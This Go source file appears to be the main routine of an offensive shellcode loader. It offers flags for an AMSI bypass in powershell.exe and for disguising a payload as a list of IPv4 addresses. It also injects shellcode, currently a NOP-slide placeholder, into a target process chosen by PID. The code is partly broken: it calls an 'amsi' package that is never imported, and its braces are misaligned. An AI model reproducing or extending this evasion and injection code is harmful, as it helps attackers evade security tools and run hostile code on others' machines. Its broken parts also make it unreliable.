package main
import (
	"fmt"
	"flag"
	"strings"
	"strconv"

	// Own modules
	"goloader/internal/helpers"
	"goloader/internal/obfuscator"
	"goloader/internal/syscall"
	"goloader/internal/evasion"

	"golang.org/x/sys/windows"
)

func main() {
	// Defining available flags
	payloadPtr := flag.String("payload", "", "payload which should be executed")
	payloadFilePtr := flag.String("payloadFile", "", "Path to file with payload")
	obfuscateToIPv4Ptr := flag.Bool("toIPv4", false, "Obfuscate payload to IPv4 list")
	restoreFromIPv4Ptr := flag.Bool("fromIPv4", false, "Restore from payload")
	bypassAmsiPtr := flag.Bool("byAMSI", false, "Performs the AMSI bypass")

	// Parse all falgs
	flag.Parse()

	// Perform AMSI bypass
	if  *bypassAmsiPtr {
		fmt.Println("[i] Try to bypass AMSI ...")
		amsi.AMSIBypass("powershell.exe")
	}

	// If no payload given, we have nothing to do
	if len(*payloadPtr) == 0 && len(*payloadFilePtr) == 0 {
		fmt.Println("[X] No payload given... nothing to do...")
		return
	}
	payload := *payloadPtr

	// Obfuscate payload to IPv4 comma separated list
	// Prints to stdout
	if *obfuscateToIPv4Ptr {
		chunk := obfuscator.ObfuscateToIPv4(payload)
		fmt.Println(strings.Join(chunk, ","))
		return
	}

	if len(*payloadFilePtr) != 0 {
		payload = helpers.GetContentFromFileWithChecks(payloadFilePtr)
		if *restoreFromIPv4Ptr && len(payload) > 0{
			payload = obfuscator.DeobfuscateFromIPv4(
				strings.Split(payload, ","))
			}
		}

		// Do the system magic
		//syscall.ExecuteSystemCallInNewProcess(payload)
	
		// Testing ....	
		shellcode := []byte{0x90, 0x90, 0x90, 0x90} // NOP slide
		pid, _ := strconv.Atoi(payload)
		processHandle := syscall.OpenProcessByProcessID(pid)
		if processHandle != windows.InvalidHandle {
			syscall.ExecuteShellcodeOnProcess(processHandle, shellcode);
		}
	}
